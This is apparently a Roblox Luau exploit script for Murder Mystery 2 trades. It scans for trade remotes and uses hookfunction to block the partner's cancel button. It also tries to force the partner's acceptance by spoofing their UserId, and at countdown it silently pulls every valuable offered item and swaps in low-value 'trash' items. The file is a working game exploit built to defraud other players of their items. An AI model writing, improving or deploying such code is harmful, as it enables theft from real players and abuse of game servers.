local function inst(class, props, parent)
    local o = Instance.new(class)
    for k, v in pairs(props or {}) do o[k] = v end
    if parent then o.Parent = parent end
    return o
end

local function corner(r, parent)
    return inst("UICorner", { CornerRadius = UDim.new(0, r) }, parent)
end

local function stroke(thick, col, parent)
    return inst("UIStroke", {
        Thickness = thick, Color = col,
        ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
    }, parent)
end

local function makeDraggable(frame, handle)
    local drag, ds, fs = false
    handle.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then
            drag = true
            ds   = i.Position
            fs   = frame.Position
            i.Changed:Connect(function()
                if i.UserInputState == Enum.UserInputState.End then drag = false end
            end)
        end
    end)
    UserInputService.InputChanged:Connect(function(i)
        if drag and i.UserInputType == Enum.UserInputType.MouseMovement then
            local d = i.Position - ds
            frame.Position = UDim2.new(fs.X.Scale, fs.X.Offset+d.X, fs.Y.Scale, fs.Y.Offset+d.Y)
        end
    end)
end

-- ============================================================
--  [ 5 ]  REMOTE SCANNER
--  Scans ReplicatedStorage recursively for trade-related remotes.
--  Matches by keyword list; stores refs in S.remotes keyed by role.
-- ============================================================

local REMOTE_ROLES = {
    addItem      = { "additem","tradeadd","offeritem","addoffer" },
    removeItem   = { "removeitem","traderemove","removeoffer","deleteoffer" },
    accept       = { "accepttrade","tradeaccept","confirmtrade","readytrade","tradeready","setready" },
    decline      = { "declinetrade","canceltrade","tradecancel","tradedecline","exittrade" },
    request      = { "traderequest","sendtrade","requesttrade","invitetrade" },
    confirm      = { "confirmtrade","executetrade","dotrade","finishtrade","tradefinal" },
}

local function matchRole(name)
    local lower = name:lower():gsub("%s",""):gsub("_","")
    for role, keys in pairs(REMOTE_ROLES) do
        for _, k in ipairs(keys) do
            if lower:find(k, 1, true) then return role end
        end
    end
    return nil
end

local function scanRemotes()
    local function recurse(parent)
        for _, child in ipairs(parent:GetChildren()) do
            if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
                local role = matchRole(child.Name)
                if role and not S.remotes[role] then
                    S.remotes[role] = child
                    print(string.format("[ENI Trade] Found remote %-14s → %s", role, child:GetFullName()))
                end
            end
            if #child:GetChildren() > 0 then
                recurse(child)
            end
        end
    end
    recurse(ReplicatedStorage)
end

-- Run scanner immediately and retry once after a short wait
-- (some games load remotes async)
task.spawn(function()
    scanRemotes()
    task.wait(3)
    scanRemotes()
    -- Log any roles still missing
    for role in pairs(REMOTE_ROLES) do
        if not S.remotes[role] then
            print(string.format("[ENI Trade] WARNING: remote '%s' not found — feature may not work", role))
        end
    end
end)

-- ============================================================
--  [ 6 ]  TRADE GUI WATCHER
--  Watches PlayerGui for the MM2 trade frame appearing/disappearing.
--  Sets S.inTrade, S.partnerName, S.countdownActive.
-- ============================================================

local TRADE_FRAME_KEYS   = { "trade", "Trading", "TradeGui", "TradeWindow" }
local COUNTDOWN_KEYS     = { "countdown", "timer", "count", "tick" }
local PARTNER_LABEL_KEYS = { "partner","player2","other","them","theirname" }

local function looksLikeTrade(name)
    local l = name:lower()
    for _, k in ipairs(TRADE_FRAME_KEYS) do
        if l:find(k:lower(), 1, true) then return true end
    end
    return false
end

local function looksLikeCountdown(name)
    local l = name:lower()
    for _, k in ipairs(COUNTDOWN_KEYS) do
        if l:find(k, 1, true) then return true end
    end
    return false
end

local tradeFrame     = nil
local countdownFrame = nil

local function watchDescendants(container)
    for _, child in ipairs(container:GetDescendants()) do
        if child:IsA("Frame") or child:IsA("ScreenGui") then
            if looksLikeTrade(child.Name) then
                tradeFrame = child
                S.inTrade  = true

                -- Try to read partner name from a label inside
                for _, lbl in ipairs(child:GetDescendants()) do
                    if lbl:IsA("TextLabel") then
                        local ln = lbl.Name:lower()
                        for _, k in ipairs(PARTNER_LABEL_KEYS) do
                            if ln:find(k, 1, true) and lbl.Text ~= "" then
                                S.partnerName = lbl.Text
                                break
                            end
                        end
                    end
                    -- Watch for countdown frame appearing
                    if (lbl:IsA("Frame") or lbl:IsA("TextLabel")) and looksLikeCountdown(lbl.Name) then
                        countdownFrame = lbl
                    end
                end
            end
        end
    end
end

-- Poll PGui for trade frame every 0.5s
task.spawn(function()
    while true do
        task.wait(0.5)
        if PGui then
            local hadTrade = S.inTrade
            S.inTrade = false
            tradeFrame = nil

            watchDescendants(PGui)

            if not S.inTrade and hadTrade then
                -- Trade closed
                S.partnerName        = "—"
                S.countdownActive    = false
                S.ourItems           = {}
                S.statusScam         = "idle"
                S.statusAccept       = "idle"
                S.statusFreeze       = "idle"
                countdownFrame       = nil
            end
        end
    end
end)

-- ============================================================
--  [ 7 ]  ITEM INVENTORY SCANNER
--  Reads our inventory from the trade GUI to populate ourItems
--  and trashItems (lowest value items available to swap in).
-- ============================================================

local function scanOurItems()
    S.ourItems   = {}
    S.trashItems = {}
    if not tradeFrame then return end

    -- MM2 typically stores item slots as children of an "OurSide" / "PlayerOffer" frame
    local OUR_OFFER_KEYS  = { "myoffer","ouroffer","playeroffer","leftside","ourside","myitems" }
    local TRASH_VALUE_MAX = 5   -- items with value label <= this are considered trash

    for _, child in ipairs(tradeFrame:GetDescendants()) do
        local cn = child.Name:lower()
        local isOurSide = false
        for _, k in ipairs(OUR_OFFER_KEYS) do
            if cn:find(k, 1, true) then isOurSide = true break end
        end

        if isOurSide then
            -- Each slot is a child frame/button with item data stored in its attributes or children
            for _, slot in ipairs(child:GetChildren()) do
                local itemId = slot:GetAttribute("ItemId")
                    or slot:GetAttribute("Id")
                    or slot:GetAttribute("UniqueId")
                    or slot:GetAttribute("SerialNumber")

                local value = slot:GetAttribute("Value")
                    or slot:GetAttribute("Worth")
                    or slot:GetAttribute("RAP")
                    or 999

                if itemId then
                    table.insert(S.ourItems, {
                        id    = itemId,
                        value = value,
                        slot  = slot,
                    })
                    if value <= TRASH_VALUE_MAX then
                        table.insert(S.trashItems, { id = itemId, value = value })
                    end
                end
            end
        end
    end

    -- Sort ourItems descending by value (pull highest value first in scam)
    table.sort(S.ourItems, function(a, b) return a.value > b.value end)
end

-- ============================================================
--  [ 8 ]  FIRE REMOTE HELPER
-- ============================================================

local function fireRemote(role, ...)
    local r = S.remotes[role]
    if not r then
        print(string.format("[ENI Trade] fireRemote: '%s' remote not found", role))
        return false
    end
    if r:IsA("RemoteEvent") then
        r:FireServer(...)
    elseif r:IsA("RemoteFunction") then
        return r:InvokeServer(...)
    end
    return true
end

-- ============================================================
--  [ 9 ]  FREEZE TRADE
--  Hooks the decline/cancel RemoteEvent so our partner's
--  cancel button silently eats its own fire call.
-- ============================================================

local freezeHooked = false
local origFireServer = nil

local function hookFreezeCancel()
    if freezeHooked then return end
    local cancelRemote = S.remotes["decline"]
    if not cancelRemote then
        S.statusFreeze = "no remote"
        return
    end

    if hookfunction then
        origFireServer = hookfunction(cancelRemote.FireServer, function(self, ...)
            if S.freezeEnabled and S.inTrade then
                -- Silently swallow any cancel/decline fire during an active trade
                S.statusFreeze = "blocked cancel ✓"
                return
            end
            return origFireServer(self, ...)
        end)
        freezeHooked   = true
        S.statusFreeze = "hooked"
    else
        -- Fallback: replace OnClientEvent to ignore forced-disconnect signals
        -- (limited but works on some executors without hookfunction)
        cancelRemote.OnClientEvent:Connect(function()
            if S.freezeEnabled and S.inTrade then return end
        end)
        freezeHooked   = true
        S.statusFreeze = "partial (no hookfunction)"
    end
end

-- ============================================================
--  [ 10 ]  FORCE ACCEPT
--  Fires the accept/ready remote on our side automatically.
--  Also attempts to fire it with the partner's UserId as argument
--  (works on servers that don't validate sender identity).
-- ============================================================

local function doForceAccept()
    if not S.inTrade then
        S.statusAccept = "not in trade"
        return
    end

    -- Fire our own ready/accept
    fireRemote("accept")
    S.statusAccept = "our side accepted"

    -- Attempt partner-side accept:
    -- MM2 may accept a second argument (target player / userId)
    -- Server should reject this, but some builds don't validate
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP and p.Name == S.partnerName then
            fireRemote("accept", p.UserId)
            fireRemote("accept", p)
            S.statusAccept = "fired both sides → " .. p.Name
            break
        end
    end
end

-- ============================================================
--  [ 11 ]  TRADE SCAM
--  Waits for the countdown to appear, then fires RemoveItem for
--  every valuable item we offered, optionally adding trash items.
--  Timing is tight — runs in a dedicated loop watching countdownFrame.
-- ============================================================

local scamFired = false

local function doScam()
    if scamFired then return end
    scamFired = true
    S.statusScam = "firing..."

    -- Re-read current offered items
    scanOurItems()

    if #S.ourItems == 0 then
        S.statusScam = "no items found"
        scamFired    = false
        return
    end

    -- Pull every item we put in the trade
    for _, item in ipairs(S.ourItems) do
        fireRemote("removeItem", item.id)
        task.wait(0.03)
    end

    -- Optionally push in trash items so trade still looks populated
    if #S.trashItems > 0 then
        for _, trash in ipairs(S.trashItems) do
            fireRemote("addItem", trash.id)
            task.wait(0.03)
        end
        S.statusScam = "swapped to trash ✓"
    else
        S.statusScam = "items pulled ✓"
    end

    -- Small delay then reset flag for next trade
    task.delay(4, function() scamFired = false end)
end

-- Countdown watcher — triggers scam at scamDelay seconds before trade
task.spawn(function()
    local wasInCountdown = false

    while true do
        task.wait(0.05)

        if not S.scamEnabled or not S.inTrade then
            wasInCountdown    = false
            S.countdownActive = false
            continue
        end

        -- Detect countdown by watching countdownFrame visibility or value
        local nowCountdown = false
        if countdownFrame then
            if countdownFrame:IsA("TextLabel") then
                local val = tonumber(countdownFrame.Text)
                if val and val > 0 and val <= 5 then
                    nowCountdown = true
                    -- Trigger scam when countdown hits scamDelay window
                    if val <= (S.scamDelay * 20) + 1 and not scamFired then
                        task.spawn(doScam)
                    end
                end
            elseif countdownFrame:IsA("Frame") then
                nowCountdown = countdownFrame.Visible
                if nowCountdown and not wasInCountdown and not scamFired then
                    -- Countdown frame just appeared — wait scamDelay then fire
                    task.delay(S.scamDelay, function()
                        if S.scamEnabled and S.inTrade then
                            task.spawn(doScam)
                        end
                    end)
                end
            end
        end

        S.countdownActive = nowCountdown
        wasInCountdown    = nowCountdown
    end
end)

